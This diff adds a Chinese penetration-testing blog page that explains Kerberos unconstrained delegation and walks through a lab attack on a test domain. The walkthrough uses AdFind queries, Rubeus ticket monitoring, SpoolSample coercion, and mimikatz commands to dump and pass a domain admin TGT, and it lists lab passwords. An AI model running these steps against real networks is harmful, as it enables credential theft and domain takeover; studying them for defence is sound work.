@@ -1,0 +1,481 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"antipassion.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="简介委派 在域中如果出现A使用Kerberos身份验证访问域中的服务B,而B再利用A的身份去请求域中的服务C，这个过程就可以理解为委派  例:1User访问主机S2上的HTTP服务，此时要想完整的使用HTTP服务，需再访问S3主机上的SQL数据库，但S2并不知道域用户是否拥有权限访问S3上的数据库服务权限，这时为了验证权限，S2会带着User的访问权限去申请访问SQL数据库，若User拥有权限才可">
+<meta property="og:type" content="article">
+<meta property="og:title" content="非约束委派攻击">
+<meta property="og:url" content="http://antipassion.github.io/2022/01/06/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/index.html">
+<meta property="og:site_name" content="林中小屋">
+<meta property="og:description" content="简介委派 在域中如果出现A使用Kerberos身份验证访问域中的服务B,而B再利用A的身份去请求域中的服务C，这个过程就可以理解为委派  例:1User访问主机S2上的HTTP服务，此时要想完整的使用HTTP服务，需再访问S3主机上的SQL数据库，但S2并不知道域用户是否拥有权限访问S3上的数据库服务权限，这时为了验证权限，S2会带着User的访问权限去申请访问SQL数据库，若User拥有权限才可">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://antipassion.github.io/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220106232045335.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220106233107179.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220108233836061.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220108234035281.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220109002924052.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220108234917330.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220108235639960.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220108235703392.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220109000813844.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220109003544258.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220109225405402.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220109225908898.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220109230059651.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220109230735844.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220109230941828.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220109231126642.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220109231509139.png">
+<meta property="article:published_time" content="2022-01-06T15:18:28.000Z">
+<meta property="article:modified_time" content="2022-01-24T12:30:55.413Z">
+<meta property="article:author" content="Nayon|1163875625@qq.com">
+<meta property="article:tag" content="内网渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://antipassion.github.io/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220106232045335.png">
+
+<link rel="canonical" href="http://antipassion.github.io/2022/01/06/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>非约束委派攻击 | 林中小屋</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="林中小屋" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">林中小屋</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://antipassion.github.io/2022/01/06/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Nayon|1163875625@qq.com">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="林中小屋">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          非约束委派攻击
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-01-06 23:18:28" itemprop="dateCreated datePublished" datetime="2022-01-06T23:18:28+08:00">2022-01-06</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-01-24 20:30:55" itemprop="dateModified" datetime="2022-01-24T20:30:55+08:00">2022-01-24</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a><strong>简介</strong></h3><p><strong>委派</strong></p>
+<p>在域中如果出现A使用Kerberos身份验证访问域中的服务B,而B再利用A的身份去请求域中的服务C，这个过程就可以理解为委派</p>
+<p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220106232045335.png" alt="image-20220106232045335"></p>
+<h4 id="例"><a href="#例" class="headerlink" title="例:"></a>例:</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User访问主机S2上的HTTP服务，此时要想完整的使用HTTP服务，需再访问S3主机上的SQL数据库，但S2并不知道域用户是否拥有权限访问S3上的数据库服务权限，这时为了验证权限，S2会带着User的访问权限去申请访问SQL数据库，若User拥有权限才可进行访问。</span><br></pre></td></tr></table></figure>
+
+<h3 id="非约束委派"><a href="#非约束委派" class="headerlink" title="非约束委派"></a>非约束委派</h3><p>非约束委派Kerberos中实现时，User会将自KDC拿到的TGT发送给访问的服务机器Service1,Service1再通过拿到手的TGT票据去申请访问其他域内服务，Service1在拿到用户的TGT票据后，会对其留存，以便下次备用，这时，我们便可在拿下的Service1机器中拿到域用户的TGT票据，从而访问域内的可访问服务(域管用户可访问任意服务)</p>
+<h4 id="非约束委派流程图"><a href="#非约束委派流程图" class="headerlink" title="非约束委派流程图"></a>非约束委派流程图</h4><p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220106233107179.png" alt="image-20220106233107179"></p>
+<p><strong>流程</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">1.用户发KPB_AS_REQ消息请求[可转发TGT（forwardable TGT）] ,为了方便，先将其称之为TGT1。</span><br><span class="line"></span><br><span class="line">2.KDC在KPB_AS_REQ中返回给User TGT1。</span><br><span class="line"></span><br><span class="line">3.用户再通过TGT1向KDC请求转发TGT（forwardedTGT，我们称之为TGT2）。</span><br><span class="line"></span><br><span class="line">4.在KRB_TGS_REP消息中返回Forwarded TGT 给User</span><br><span class="line"></span><br><span class="line">5.User使用TGT1向KDC申请访问service1的ST(service Ticket)</span><br><span class="line"></span><br><span class="line">6.KDC返回给用户一个ST</span><br><span class="line"></span><br><span class="line">7.User发送KRB_AP_REQ请求至service1，这个请求包括了TGT1和ST、TGT2、TGT2的sessionKey。</span><br><span class="line"></span><br><span class="line">8.service1使用用户的TGT2使用KRB_TGS_REQ发送给KDC，以用户的名义申请可以访问service2的票据.</span><br><span class="line"></span><br><span class="line">9.KDC在KRB_TGS_REP消息中返回service2到service1的票据.</span><br><span class="line"></span><br><span class="line">10.Service1以用户的名义向Service2发起KRB_AP_REQ请求.</span><br><span class="line"></span><br><span class="line">11.Service2响应步骤10中的Service1请求。</span><br><span class="line"></span><br><span class="line">12.Service1响应步骤7中用户的请求。</span><br><span class="line"></span><br><span class="line">13.在这个过程中的TGT转发机制，没有限制Service1对TGT2的使用，也就是说Service1可以通过TGT2来请求任意服务。</span><br><span class="line"></span><br><span class="line">14.KDC返回步骤13中请求的票据</span><br><span class="line"></span><br><span class="line">15.和16即为Service1通过模拟用户来访问其他Service。</span><br></pre></td></tr></table></figure>
+
+<p><strong>下面对非约束委派进行复现利用</strong></p>
+<h3 id="非约束委派配置"><a href="#非约束委派配置" class="headerlink" title="非约束委派配置"></a>非约束委派配置</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -U -A MSSQLvc/mssql.vulntarget.com:<span class="number">1433</span> win2016</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220108233836061.png" alt="image-20220108233836061"></p>
+<p>当DC配置SPN给域用户Win2016时，在域内将可产生对域用户的委派，我们可以看到，域管理员勾选win2016用户的委派-信任此用户作为任何服务的委派时，将会造成非约束委派的问题。</p>
+<p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220108234035281.png" alt="image-20220108234035281"></p>
+<p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220109002924052.png" alt="image-20220109002924052"></p>
+<h4 id="非约束委派其特征"><a href="#非约束委派其特征" class="headerlink" title="非约束委派其特征"></a>非约束委派其特征</h4><p>当域用户或机器被设置了非约束委派时，其userAccountControl属性将会包含一个名为”TRUSTED_FOR_DELEGATION”的标志。</p>
+<p>我们可以在ADSI编辑器中找到</p>
+<p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220108234917330.png" alt="image-20220108234917330"></p>
+<h4 id="探测域内是否存在非约束委派"><a href="#探测域内是否存在非约束委派" class="headerlink" title="探测域内是否存在非约束委派"></a>探测域内是否存在非约束委派</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">win2019 10.0.10.110 dc vulntarget\win2019::Admin@666</span><br><span class="line">win2016 10.0.10.111 域内机器 vulntarget\win2016::Admin#123</span><br></pre></td></tr></table></figure>
+
+<p>查找利用账户时，我们暂且不考虑机器账户，因为拿到域内机器账户的票据后，我们无法用于远程访问，因此，我们在进行非约束委派攻击时，首先考虑<strong>域用户</strong>，但这并不意味着<strong>机器账户</strong>没有任何用处，当我们可以对机器账户进行非约束委派攻击时，我们可以根据拿到的<strong>机器账户TGT票据</strong>进行DCsync拿到域内hash等操作。</p>
+<p>利用adfind查找域内启用了非约束委派的机器</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adfind.exe -h 10.0.10.110 -u vulntarget\win2016 -up Admin#123 -b &quot;DC=vulntarget,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220108235639960.png" alt="image-20220108235639960"></p>
+<p>无需域用户账号密码查询非约束委派的域用户</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe  -b <span class="string">&quot;DC=networksec,DC=loacl&quot;</span> -f <span class="string">&quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> cn distinguishedName</span><br></pre></td></tr></table></figure>
+
+
+
+<p>利用adfind查找域内启用了非约束委派的域内用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adfind.exe -h 10.0.10.110 -u vulntarget\win2016 -up Admin#123 -b &quot;DC=vulntarget,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220108235703392.png" alt="image-20220108235703392"></p>
+<p>无需密码查找域内非约束委派的主机</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=DANTE,DC=loacl&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="机器账户的非约束委派攻击"><a href="#机器账户的非约束委派攻击" class="headerlink" title="机器账户的非约束委派攻击"></a>机器账户的非约束委派攻击</h4><p>首先在具备非约束委派攻击条件的域内机器执行Rubeus.exe监控登录操作，并实时转储TGT,（此操作需要本地管理员权限）</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe monitor /interval:<span class="number">1</span>  /filteruser:win2019$</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220109000813844.png" alt="image-20220109000813844"></p>
+<p>利用spoolsample项目使域控强制认证域机器抓取转储tgt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SpoolSample.exe win2019 win2016</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220109003544258.png" alt="image-20220109003544258"></p>
+<p>很遗憾，此处由于dc已是win2019 ，强制认证已经得到微软的修复，因此此处转储机器账户TGT失败。</p>
+<p><code>**低版本域控强制认证成功案例待补充**</code></p>
+<p>但再Win2019 以下如win2012 win2008等服务器内 ，使用spoolSample项目强制域控机认证域机器是有很大概率奏效的。</p>
+<h4 id="域用户的非约束委派攻击"><a href="#域用户的非约束委派攻击" class="headerlink" title="域用户的非约束委派攻击"></a>域用户的非约束委派攻击</h4><p>倘若发现存在非约束委派的用户，这时，我们可以在域内所有可以登陆此用户的域内机器上尝试非约束委派攻击，获取其缓存的服务账号票据，并期望获得域控的票据。</p>
+<p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220109225405402.png" alt="image-20220109225405402"></p>
+<p>根据前文所用的adfind.exe ，我们可以发现，在win2016机器上，具有我们执行域用户的非约束委派攻击的条件</p>
+<p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220109225908898.png" alt="image-20220109225908898"></p>
+<p>此处为了演示效果，我们主动让域控对域内机器win2016发起认证</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Enter-PSSession -ComputerName win2016</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220109230059651.png" alt="image-20220109230059651"></p>
+<p>此时，在win2016机器内已经存储下来了域管账户的tgt票据。</p>
+<p>在win2016机器内利用mimikatz转储票据(以管理员权限启动)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">kerberos::purge </span><br><span class="line">sekurlsa::tickets /exports</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220109230735844.png" alt="image-20220109230735844"></p>
+<p>可以看到转储成功，已拿到域管用户的tgt票据，接下来利用ptt hash传递，获得域管权限。</p>
+<p>PTT之前，我们是无法通过Kerberos认证访问域控机的共享目录的</p>
+<p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220109230941828.png" alt="image-20220109230941828"></p>
+<p>利用mimikatz进行ptt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt [0;2c7f64]-2-0-60a10000-Administrator@krbtgt-VULNTARGET.COM.kirbi</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220109231126642.png" alt="image-20220109231126642"></p>
+<p>此时已成功执行！</p>
+<p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220109231509139.png" alt="image-20220109231509139"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag"># 内网渗透</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/11/19/PE%E7%BB%93%E6%9E%84-DOS%E5%A4%B4/" rel="prev" title="PE结构-DOS头">
+      <i class="fa fa-chevron-left"></i> PE结构-DOS头
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/01/09/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/" rel="next" title="约束委派攻击">
+      约束委派攻击 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B"><span class="nav-number">1.</span> <span class="nav-text">简介</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BE%8B"><span class="nav-number">1.1.</span> <span class="nav-text">例:</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="nav-number">2.</span> <span class="nav-text">非约束委派</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%B5%81%E7%A8%8B%E5%9B%BE"><span class="nav-number">2.1.</span> <span class="nav-text">非约束委派流程图</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E9%85%8D%E7%BD%AE"><span class="nav-number">3.</span> <span class="nav-text">非约束委派配置</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E5%85%B6%E7%89%B9%E5%BE%81"><span class="nav-number">3.1.</span> <span class="nav-text">非约束委派其特征</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8E%A2%E6%B5%8B%E5%9F%9F%E5%86%85%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="nav-number">3.2.</span> <span class="nav-text">探测域内是否存在非约束委派</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E7%9A%84%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB"><span class="nav-number">3.3.</span> <span class="nav-text">机器账户的非约束委派攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%9F%E7%94%A8%E6%88%B7%E7%9A%84%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB"><span class="nav-number">3.4.</span> <span class="nav-text">域用户的非约束委派攻击</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Nayon|1163875625@qq.com</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">21</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Nayon|1163875625@qq.com</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
